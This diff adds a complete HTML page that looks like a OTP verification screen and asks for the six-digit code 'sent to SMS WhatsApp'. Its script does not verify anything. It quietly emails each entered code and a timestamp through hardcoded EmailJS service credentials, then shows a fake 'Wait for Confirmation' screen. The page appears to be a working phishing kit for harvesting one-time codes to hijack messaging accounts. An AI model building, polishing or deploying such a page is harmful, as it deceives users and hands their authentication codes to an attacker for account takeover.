@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enter Experience Code</title>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    :root {
+      --bg-start: #667eea;
+      --bg-end: #764ba2;
+      --card: #ffffff;
+      --primary: #5b5bd6;
+      --primary-dark: #4747b8;
+      --text: #1f2937;
+      --muted: #6b7280;
+      --error: #dc2626;
+      --success: #16a34a;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(135deg, var(--bg-start), var(--bg-end));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: var(--card);
+      width: 100%;
+      max-width: 420px;
+      border-radius: 18px;
+      padding: 40px 30px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .view { display: none; }
+    .view.active { display: block; animation: fadeIn 0.4s ease; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #eef2ff;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      margin: 0 auto 20px;
+    }
+
+    h1 { font-size: 24px; color: var(--text); margin-bottom: 8px; }
+    .subtitle { color: var(--muted); font-size: 15px; line-height: 1.5; margin-bottom: 28px; }
+    .subtitle strong { color: #25D366; }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .otp-inputs input {
+      width: 48px;
+      height: 56px;
+      border: 2px solid #d1d5db;
+      border-radius: 10px;
+      font-size: 22px;
+      font-weight: 600;
+      text-align: center;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .otp-inputs input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(91, 91, 214, 0.2);
+    }
+
+    .message {
+      min-height: 22px;
+      font-size: 14px;
+      margin-bottom: 14px;
+      color: var(--error);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: var(--primary);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn:hover:not(:disabled) { background: var(--primary-dark); }
+    .btn:active:not(:disabled) { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .wait-icon {
+      background: #ecfdf5;
+      color: var(--success);
+    }
+
+    .wait-icon.pulse { animation: pulse 1.6s ease-in-out infinite; }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+
+    .dots::after {
+      content: "";
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: ""; }
+      25% { content: "."; }
+      50% { content: ".."; }
+      75% { content: "..."; }
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-top: 20px;
+      color: var(--primary);
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .back-link:hover { text-decoration: underline; }
+
+    @media (max-width: 380px) {
+      .otp-inputs input { width: 40px; height: 50px; font-size: 20px; }
+      .otp-inputs { gap: 7px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <!-- VIEW 1: Enter Code -->
+    <section id="entry" class="view active">
+      <div class="icon">🔐</div>
+      <h1>Enter OTP Code</h1>
+      <p class="subtitle">
+        Enter the 6-digit OTP code sent to SMS<strong>WhatsApp</strong>.
+      </p>
+
+      <form id="codeForm" autocomplete="off">
+        <div class="otp-inputs">
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 1" />
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 2" />
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 3" />
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 4" />
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 5" />
+          <input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="Digit 6" />
+        </div>
+
+        <div id="message" class="message"></div>
+
+        <button type="submit" id="submitBtn" class="btn">Enter Code</button>
+      </form>
+    </section>
+
+    <!-- VIEW 2: Wait for Confirmation -->
+    <section id="wait" class="view">
+      <div class="icon wait-icon pulse">⏳</div>
+      <h1>Wait for Confirmation<span class="dots"></span></h1>
+      <p class="subtitle">
+        Your code has been sent. Please wait while we confirm.
+      </p>
+      <a href="#entry" class="back-link">← Back to code entry</a>
+    </section>
+
+  </div>
+
+  <script>
+    // ===== EmailJS Configuration =====
+    const EMAILJS_PUBLIC_KEY = "ttrKOZNMDMqFjqfPT";
+    const EMAILJS_SERVICE_ID = "service_8iot5xx";
+    const EMAILJS_TEMPLATE_ID = "template_2vp7oqq";
+
+    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+
+    // ===== Elements =====
+    const form = document.getElementById("codeForm");
+    const inputs = Array.from(form.querySelectorAll(".otp-inputs input"));
+    const submitBtn = document.getElementById("submitBtn");
+    const message = document.getElementById("message");
+
+    // ===== Auto-advance between digit boxes =====
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        input.value = input.value.replace(/\D/g, "");
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        message.textContent = "";
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+        if (e.key === "Enter") {
+          form.requestSubmit();
+        }
+      });
+
+      input.addEventListener("focus", () => input.select());
+    });
+
+    // ===== Paste full 6-digit code into any box =====
+    form.addEventListener("paste", (e) => {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData)
+        .getData("text")
+        .replace(/\D/g, "")
+        .slice(0, 6);
+
+      pasted.split("").forEach((digit, i) => {
+        inputs[i].value = digit;
+      });
+
+      const next = Math.min(pasted.length, inputs.length - 1);
+      inputs[next].focus();
+    });
+
+    function getCode() {
+      return inputs.map((i) => i.value).join("");
+    }
+
+    function clearInputs() {
+      inputs.forEach((i) => (i.value = ""));
+      inputs[0].focus();
+    }
+
+    // ===== Views (acts as the redirect to the wait page) =====
+    function showView(name) {
+      document.querySelectorAll(".view").forEach((v) => v.classList.remove("active"));
+      const view = document.getElementById(name);
+      if (view) view.classList.add("active");
+    }
+
+    function handleRoute() {
+      const hash = window.location.hash.replace("#", "");
+      showView(hash === "wait" ? "wait" : "entry");
+    }
+
+    window.addEventListener("hashchange", handleRoute);
+
+    // ===== Submit: send code by email, then redirect to wait page =====
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const code = getCode();
+
+      if (!/^\d{6}$/.test(code)) {
+        message.textContent = "Please enter all 6 digits.";
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="spinner"></span>Verifying...';
+      message.textContent = "";
+
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          code: code,
+          experience_id: code,
+          time: new Date().toLocaleString(),
+        });
+
+        clearInputs();
+        window.location.hash = "wait";
+        handleRoute();
+      } catch (err) {
+        console.error("EmailJS error:", err);
+        message.textContent = "Failed to send the code. Please try again.";
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Enter Code";
+      }
+    });
+
+    // Initial route
+    handleRoute();
+  </script>
+
+</body>
+</html>
